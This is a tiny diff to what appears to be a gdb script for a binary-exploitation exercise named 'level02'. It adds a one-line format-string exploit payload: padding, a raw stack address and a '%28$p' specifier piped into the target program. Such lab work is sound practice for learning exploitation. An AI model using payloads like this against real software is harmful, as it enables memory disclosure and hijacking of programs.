@@ -5,3 +5,5 @@ run
 set {char[7]} 0x400bb2 = "./test"
 x/s 0x400bb2
 c
+
+python -c 'print("aaaaaaaa" + "\x20\xe4\xff\xff\xff\xff\xff\x7f" + "%28$p ")' | ./level02
